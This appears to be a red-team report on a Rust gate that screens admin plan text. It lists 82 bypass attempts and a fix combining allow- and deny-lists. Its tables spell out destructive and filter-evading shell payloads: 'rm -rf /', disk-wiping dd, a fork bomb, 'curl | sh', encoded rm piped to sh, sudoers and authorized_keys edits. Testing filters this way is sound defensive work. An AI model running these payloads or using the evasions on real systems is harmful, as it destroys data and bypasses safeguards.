<!-- SPDX-License-Identifier: MIT -->
<!-- Copyright (c) 3000 Galion / galion-studio -->

# HADES admin-safety red team (S3.1)

2026-10-20 23:00 CEST +02:00 · branch `swarm/hades-redteam` (base `swarm/hades-approval` ccaab42) · slot 38

Target: `hades_gate::safety::review` / `review_plan`, the hard rule that runs on the target and the exact plan
text **before** any token. If it passes, a validly signed token for `heal-apply`/`switch`/`rollback` yields
`Decision::WouldApply`. A row marked **WouldApply** below is a bypass: a harmful plan an admin could be talked
into signing (or a forged plan riding a real signature for a different plan text never gets this far; the
hash binds the bytes).

## Result

| Family | Attempts | WouldApply on ccaab42 | WouldApply now |
|---|---:|---:|---:|
| shell syntax (`$()`, backticks, `eval`, `sh -c`, base64/base32/hex/octal, `${IFS}`, alias, quoting, `&&`, newline, subshell) | 25 | 16 | 0 |
| file destruction (`find -delete`, `dd of=`, `truncate`, `>`/`>>` onto config, `cp /dev/null`, `mv`, `tee`, `install`, `sed -i`, rm variants, `chattr`) | 19 | 12 | 0 |
| access / credentials (`systemctl mask/disable`, `crontab`, `ssh-keygen`, `authorized_keys`, firewall, `ip route`, `passwd`/`usermod`/`deluser`, `setcap`, sudoers, `curl \| sh`) | 14 | 6 | 0 |
| allowed verb leading a hazard (probes the new allow-list) | 10 | 9 | 0 |
| Unicode / homoglyph / control bytes | 6 | 0 | 0 |
| path traversal and odd targets | 8 | 5 | 0 |
| **total** | **82** | **48** | **0** |

Legitimate plans (gaia-hades `plan_for` for rollback and heal-apply, every plan in the existing tests and docs):
9 of 9 still pass, before and after. Legitimate targets (including a templated `galion-room@2`): 5 of 5 pass.

Through the real binary (`hades-gate serve`, valid signed token per plan, `POST /v1/approve`) the count is
**43 → 0**: the 5 target rows were already stopped end to end by `token::valid_target`, which runs before
`safety::review` inside `Approver`. They were real holes only in the public `safety::review` API.

### What was actually wrong

1. **Unicode was fine** for plans: `review_plan` already refuses every byte outside printable ASCII + `\n`/`\t`
   (verified: Cyrillic, fullwidth, zero-width, NUL, CR all refused).
2. **`review_target` had no character check at all.** `hаdes-gate` with a Cyrillic `а` passed the
   protected-target rule, and so did `../etc/x`, `galion-tuner;wipe`, `galion tuner` and the empty string.
3. **The deny-list matches spellings, not meaning.** `rm` was only refused as `rm -r`/`rm -f`, so
   `rm${IFS}-rf${IFS}/`, `r""m -rf`, `r\m -rf`, `alias go=rm; go -rf /` and plain `rm file` got through; there was
   no entry at all for `sh`/`bash -c`, `find -delete`, `systemctl`, `>` onto a file, `cp`, `mv`, `tee`, `setcap`,
   `ip route`, `base32`, octal `printf`, `perl`/`awk`, `curl | sh`. `ssh-keygen` *was* refused, but only because
   the word splitter breaks it into `ssh`.

## The fix: allow-list on top of the deny-list

Evaluated: (a) keep patching the deny-list, (b) replace it with an allow-list, (c) both.

* (a) is the losing game the table shows: every new spelling is a new row. Shell has unbounded spellings.
* (b) alone loses the specific refusal reasons (`drop table`, `authorized_keys`, ...) the existing tests and
  operators rely on, and an allowed verb can still lead a harmful sentence (`operator runs find / -delete`).
* **(c) implemented.** `review_plan` now runs, in order:
  1. size and printable-ASCII checks (unchanged);
  2. the deny-list (kept, so known hazards are named; ~45 words added: `rm`, `find`, `delete`, `dd`, `mv`, `cp`,
     `tee`, `install`, `sed`, `systemctl`, `mask`, `setcap`, `ip`, `route`, `keygen`, network fetchers, shells,
     interpreters, `exec`, `source`, `alias`, `xargs`, `nohup`, `setsid`, `printf`, `base32`, `basenc`; plus a
     whitespace-token rule for `sh`, `*/sh`, `-c`, because a WORDS entry `sh` would refuse the legitimate
     `deploy/rollback.sh`);
  3. **character allow-list**: besides letters, digits, space, tab and newline only `/ . - _ : , ( ) ;` may occur.
     No `$`, backtick, quotes, backslash, `|`, `&`, `>`, `<`, `=`, `{}`, `*`, `?`, `!`, `~`, `#`. This one rule
     kills substitution, `${IFS}`, quoting/escaping tricks, redirection, pipes, globbing and chaining;
  4. **verb allow-list**: every statement (each line, and each `;`-separated part) must start with one of
     `apply append keep operator read record restart switch take verify` (`safety::PLAN_VERBS`), exactly the
     leading words of the approvable plans. A deny-list miss now also needs an allowed verb to get through.

  `review_target` now requires 1 to 64 bytes of `A-Z a-z 0-9 . _ - @ :` (the same set as
  `token::valid_target`), a letter or digit first and no `..`, before the protected-name check.

Public API is unchanged apart from two new `pub const`s (`PLAN_VERBS`, `MAX_TARGET_BYTES`); no `Hazard`
variants were added (the new refusals use `Opaque`/`ProtectedTarget`), so downstream `match`es still compile.
No other crate in integration-1 calls `safety::review*` (checked with grep).

### Behaviour changes to know about

* gaia-hades `plan_for(Teardown)` (`keep every data volume; nothing is deleted`, `unit's`) is now refused by
  `review_plan`. Teardown is never approvable (`adapter::gaia_action` maps it to `None`), so nothing that used
  to get `WouldApply` changes; a hand-written teardown plan sent as `heal-apply` is now refused, which is right.
* A new approvable plan whose line starts with another verb (e.g. `drain`, `promote`) is refused until the verb
  is added to `PLAN_VERBS` with a test. That is the intended cost: one deliberate code change per new verb.

### Residual risk (honest)

* The plan is **prose**, not a typed command. After an allowed verb, words that are on no list
  (`restart x (wipe)`, `apply the fix that empties the volume`) still pass. That is harmless while HADES only
  says `WouldApply` and executes nothing, which is the current design. **It is not safe to feed plan text to a
  shell** if HADES is ever wired to an executor: see the owner decision below.
* The deny-list is still substring/word based; it is now the second line, not the only one.

## Owner decision (Slavik): before HADES drives anything that executes

| Option | What | Evidence / cost |
|---|---|---|
| A | Keep prose plans + this allow-list; the executor never runs plan text, only fixed Rust actions per (action, target) | Cheapest. The plan is then only a human-readable record that the token hashes. |
| B (recommended before any executor) | Typed plans: `enum Step { Restart(Service), Verify(Url), Switch(Release), ... }`, canonical encoding signed and hashed instead of free text | Removes the parser problem entirely: nothing to bypass because there is no shell. ~1 to 2 days, touches gaia-hades `plan_for`. |
| C | Keep everything as today | Fine only as long as `WouldApply` never executes anything. |

## Every attempt

Generated by `cargo run -p hades-gate --example redteam_enum` (corpus: `crates/hades-gate/tests/support/redteam_corpus.rs`);
"before" was produced by the same example and corpus run inside a ccaab42 checkout. The payload is shown as a Rust string literal.

| # | Family | Attempt | Payload | ccaab42 (before) | this branch (after) |
|---|--------|---------|---------|------------------|---------------------|
| 1 | shell | command substitution $() | `` "switch to $(rm -rf /)" `` | refused: destructive command refused (rm -r) | refused: destructive command refused (rm -r) |
| 2 | shell | backtick substitution | `` "switch to `rm -rf /`" `` | refused: destructive command refused (rm -r) | refused: destructive command refused (rm -r) |
| 3 | shell | process substitution <() | `` "verify <(curl evil)" `` | refused: plan cannot be reviewed (process substitution) | refused: plan cannot be reviewed (process substitution) |
| 4 | shell | eval of a variable | `` "restart x; eval \"$CMD\"" `` | refused: plan cannot be reviewed (eval) | refused: plan cannot be reviewed (eval) |
| 5 | shell | sh -c payload | `` "restart x; sh -c 'wipe it'" `` | **WouldApply** | refused: plan cannot be reviewed (shell) |
| 6 | shell | bash -c payload | `` "restart x; bash -c 'wipe it'" `` | **WouldApply** | refused: plan cannot be reviewed (shell) |
| 7 | shell | zsh -c payload | `` "restart x; zsh -c 'wipe it'" `` | **WouldApply** | refused: plan cannot be reviewed (shell) |
| 8 | shell | base64 decode pipe | `` "restart x; echo cm0gLXJmIC8= \| base64 -d \| sh" `` | refused: plan cannot be reviewed (encoded payload) | refused: plan cannot be reviewed (encoded payload) |
| 9 | shell | base32 decode pipe | `` "restart x; echo NZXW \| base32 -d \| sh" `` | **WouldApply** | refused: plan cannot be reviewed (encoded payload) |
| 10 | shell | xxd hex decode | `` "restart x; echo 726d \| xxd -r -p \| sh" `` | refused: plan cannot be reviewed (encoded payload) | refused: plan cannot be reviewed (encoded payload) |
| 11 | shell | \x hex escapes | `` "restart x; printf '\\x72\\x6d -rf /'" `` | refused: plan cannot be reviewed (escaped bytes) | refused: plan cannot be reviewed (escaped bytes) |
| 12 | shell | printf octal escapes | `` "restart x; printf '\\162\\155 -rf /' \| sh" `` | **WouldApply** | refused: plan cannot be reviewed (encoded payload) |
| 13 | shell | ${IFS} instead of space | `` "restart${IFS}x;rm${IFS}-rf${IFS}/" `` | **WouldApply** | refused: destructive command refused (rm) |
| 14 | shell | $IFS bare | `` "restart x;rm$IFS-rf$IFS/" `` | **WouldApply** | refused: destructive command refused (rm) |
| 15 | shell | alias then call | `` "restart x; alias go=rm; go -rf /" `` | **WouldApply** | refused: plan cannot be reviewed (alias) |
| 16 | shell | quoting split of rm | `` "restart x; r\"\"m -rf /" `` | **WouldApply** | refused: plan cannot be reviewed (shell metacharacter) |
| 17 | shell | backslash split of rm | `` "restart x; r\\m -rf /" `` | **WouldApply** | refused: plan cannot be reviewed (shell metacharacter) |
| 18 | shell | env var holds command | `` "restart x; $DELETER /var" `` | **WouldApply** | refused: plan cannot be reviewed (shell metacharacter) |
| 19 | shell | perl -e | `` "restart x; perl -e 'unlink glob q{*}'" `` | refused: destructive command refused (unlink) | refused: plan cannot be reviewed (interpreter) |
| 20 | shell | awk system() | `` "restart x; awk 'BEGIN{system(\"wipe\")}'" `` | **WouldApply** | refused: plan cannot be reviewed (interpreter) |
| 21 | shell | nohup background | `` "restart x; nohup bad &" `` | **WouldApply** | refused: plan cannot be reviewed (background job) |
| 22 | shell | && chain | `` "restart x && wipe" `` | **WouldApply** | refused: plan cannot be reviewed (shell metacharacter) |
| 23 | shell | newline smuggles a 2nd command | `` "restart galion-tuner\nwipe /var/lib/galion" `` | **WouldApply** | refused: plan cannot be reviewed (statement does not start with an allow-listed plan verb) |
| 24 | shell | subshell ( ) | `` "restart x;(wipe)" `` | **WouldApply** | refused: plan cannot be reviewed (statement does not start with an allow-listed plan verb) |
| 25 | shell | fork bomb | `` ":(){ :\|:& };:" `` | refused: destructive command refused (fork bomb) | refused: destructive command refused (fork bomb) |
| 26 | file | rm -rf | `` "switch; rm -rf /var/lib/galion" `` | refused: destructive command refused (rm -r) | refused: destructive command refused (rm -r) |
| 27 | file | rm -fr reordered | `` "switch; rm -fr /" `` | refused: destructive command refused (rm -f) | refused: destructive command refused (rm -f) |
| 28 | file | plain rm | `` "switch; rm /opt/galion/config.toml" `` | **WouldApply** | refused: destructive command refused (rm) |
| 29 | file | find -delete | `` "switch; find / -name '*.toml' -delete" `` | **WouldApply** | refused: destructive command refused (find) |
| 30 | file | find -exec rm | `` "switch; find / -exec rm {} +" `` | **WouldApply** | refused: destructive command refused (find) |
| 31 | file | dd of=/dev/sda | `` "switch; dd if=/dev/zero of=/dev/sda" `` | refused: destructive command refused (dd) | refused: destructive command refused (dd) |
| 32 | file | dd onto config | `` "switch; dd if=/dev/zero of=/opt/galion/config.toml" `` | refused: destructive command refused (dd) | refused: destructive command refused (dd) |
| 33 | file | truncate -s0 | `` "switch; truncate -s0 /opt/galion/config.toml" `` | refused: destructive command refused (truncate) | refused: destructive command refused (truncate) |
| 34 | file | > redirect onto config | `` "switch; echo '' > /opt/galion/config.toml" `` | **WouldApply** | refused: plan cannot be reviewed (shell metacharacter) |
| 35 | file | >> append poison | `` "switch; echo bad >> /opt/galion/config.toml" `` | **WouldApply** | refused: plan cannot be reviewed (shell metacharacter) |
| 36 | file | bare > truncation | `` "> /opt/galion/config.toml" `` | **WouldApply** | refused: plan cannot be reviewed (shell metacharacter) |
| 37 | file | cp /dev/null onto file | `` "switch; cp /dev/null /opt/galion/config.toml" `` | **WouldApply** | refused: destructive command refused (cp) |
| 38 | file | mv config away | `` "switch; mv /opt/galion/config.toml /tmp" `` | **WouldApply** | refused: destructive command refused (mv) |
| 39 | file | shred | `` "switch; shred -u /opt/galion/config.toml" `` | refused: destructive command refused (shred) | refused: destructive command refused (shred) |
| 40 | file | chattr +i lockout | `` "switch; chattr +i /opt/galion/config.toml" `` | refused: admin account/access change refused (attribute change) | refused: admin account/access change refused (attribute change) |
| 41 | file | tee overwrite | `` "switch; echo bad \| tee /opt/galion/config.toml" `` | **WouldApply** | refused: destructive command refused (tee) |
| 42 | file | install /dev/null | `` "switch; install /dev/null /opt/galion/config.toml" `` | **WouldApply** | refused: destructive command refused (install) |
| 43 | file | rm with path traversal | `` "switch; rm ../../../../etc/galion.toml" `` | **WouldApply** | refused: destructive command refused (rm) |
| 44 | file | sed -i in place | `` "switch; sed -i d /opt/galion/config.toml" `` | **WouldApply** | refused: destructive command refused (sed) |
| 45 | access | systemctl mask | `` "switch; systemctl mask galion-recovery" `` | **WouldApply** | refused: admin account/access change refused (service manager) |
| 46 | access | systemctl disable | `` "switch; systemctl disable galion-tuner" `` | **WouldApply** | refused: admin account/access change refused (service manager) |
| 47 | access | crontab -r | `` "switch; crontab -r" `` | refused: admin account/access change refused (crontab) | refused: admin account/access change refused (crontab) |
| 48 | access | ssh-keygen | `` "switch; ssh-keygen -f /tmp/k" `` | **WouldApply** | refused: plan cannot be reviewed (statement does not start with an allow-listed plan verb) |
| 49 | access | append authorized_keys | `` "switch; echo k >> ~/.ssh/authorized_keys" `` | refused: admin account/access change refused (authorized_keys) | refused: admin account/access change refused (authorized_keys) |
| 50 | access | iptables drop | `` "switch; iptables -P INPUT DROP" `` | refused: admin account/access change refused (firewall) | refused: admin account/access change refused (firewall) |
| 51 | access | nft flush | `` "switch; nft flush ruleset" `` | refused: admin account/access change refused (firewall) | refused: admin account/access change refused (firewall) |
| 52 | access | ip route blackhole | `` "switch; ip route add blackhole default" `` | **WouldApply** | refused: admin account/access change refused (network change) |
| 53 | access | passwd | `` "switch; passwd slavik" `` | refused: admin account/access change refused (passwd) | refused: admin account/access change refused (passwd) |
| 54 | access | usermod -L | `` "switch; usermod -L slavik" `` | refused: admin account/access change refused (usermod) | refused: admin account/access change refused (usermod) |
| 55 | access | deluser | `` "switch; deluser slavik" `` | refused: admin account/access change refused (deluser) | refused: admin account/access change refused (deluser) |
| 56 | access | setcap | `` "switch; setcap cap_setuid+ep /tmp/x" `` | **WouldApply** | refused: admin account/access change refused (capability change) |
| 57 | access | sudoers.d drop-in | `` "switch; echo 'x ALL' >> /etc/sudoers.d/x" `` | refused: admin account/access change refused (sudoers) | refused: admin account/access change refused (sudoers) |
| 58 | access | curl \| sh installer | `` "switch; curl http://x/i \| sh" `` | **WouldApply** | refused: plan cannot be reviewed (remote payload) |
| 59 | allowverb | operator runs find -delete | `` "operator runs find / -delete" `` | **WouldApply** | refused: destructive command refused (find) |
| 60 | allowverb | operator runs sh -c | `` "operator runs sh -c wipe" `` | **WouldApply** | refused: plan cannot be reviewed (shell) |
| 61 | allowverb | operator runs bash | `` "operator runs bash /tmp/x" `` | **WouldApply** | refused: plan cannot be reviewed (shell) |
| 62 | allowverb | apply ... systemctl mask | `` "apply systemctl mask galion-recovery" `` | **WouldApply** | refused: admin account/access change refused (service manager) |
| 63 | allowverb | verify ... rm | `` "verify rm /opt/galion/config.toml" `` | **WouldApply** | refused: destructive command refused (rm) |
| 64 | allowverb | keep ... mv | `` "keep config: mv /opt/galion/config.toml /tmp" `` | **WouldApply** | refused: destructive command refused (mv) |
| 65 | allowverb | record ... /etc/shadow | `` "record /etc/shadow in lineage" `` | refused: admin account/access change refused (/etc/shadow) | refused: admin account/access change refused (/etc/shadow) |
| 66 | allowverb | take ... curl | `` "take the payload from curl http://x" `` | **WouldApply** | refused: plan cannot be reviewed (remote payload) |
| 67 | allowverb | switch ... ip route | `` "switch ip route add blackhole default" `` | **WouldApply** | refused: admin account/access change refused (network change) |
| 68 | allowverb | restart ... setcap | `` "restart setcap cap_setuid+ep /tmp/x" `` | **WouldApply** | refused: admin account/access change refused (capability change) |
| 69 | unicode | Cyrillic em in rm | `` "switch; rм -rf /" `` | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 70 | unicode | fullwidth rm | `` "switch; ｒｍ -rf /" `` | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 71 | unicode | zero-width space in rm | `` "switch; r\u{200b}m -rf /" `` | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 72 | unicode | Cyrillic a in allowed verb | `` "restаrt galion-tuner" `` | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 73 | unicode | NUL byte | `` "restart\0x" `` | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 74 | unicode | carriage return | `` "restart galion-tuner\rwipe" `` | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) | refused: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 75 | traversal | target ../../root | `` target="galion-tuner/../../root" plan="restart galion-tuner" `` | refused: protected target refused (root) | refused: protected target refused (target is not a plain service name) |
| 76 | traversal | target svc/../ssh | `` target="svc/../ssh" plan="restart galion-tuner" `` | refused: protected target refused (ssh) | refused: protected target refused (target is not a plain service name) |
| 77 | traversal | target ../etc/x | `` target="../etc/x" plan="restart galion-tuner" `` | **WouldApply** | refused: protected target refused (target is not a plain service name) |
| 78 | traversal | target with shell | `` target="galion-tuner;wipe" plan="restart galion-tuner" `` | **WouldApply** | refused: protected target refused (target is not a plain service name) |
| 79 | traversal | target with space | `` target="galion tuner" plan="restart galion-tuner" `` | **WouldApply** | refused: protected target refused (target is not a plain service name) |
| 80 | traversal | empty target | `` target="" plan="restart galion-tuner" `` | **WouldApply** | refused: protected target refused (target is not a plain service name) |
| 81 | traversal | Cyrillic target | `` target="hаdes-gate" plan="restart galion-tuner" `` | **WouldApply** | refused: protected target refused (target is not a plain service name) |
| 82 | traversal | plan path traversal to ssh | `` "verify ../../root/.ssh/" `` | refused: secret exposure refused (ssh dir) | refused: secret exposure refused (ssh dir) |

## Tests

* `crates/hades-gate/tests/redteam.rs`: `every_redteam_attempt_is_refused` (committed failing first, 8421bbc:
  48 bypasses on ccaab42), `legitimate_plans_still_pass`, `legitimate_targets_still_pass`.
* `crates/hades-gate/tests/real_redteam.rs` (`GALION_REAL=1`): real binary over HTTP; see
  `docs/real-tests/hades-redteam.md`.
* The existing unit tests (`safety::tests`) and `tests/approval.rs` pass unchanged, including their specific
  refusal kinds.
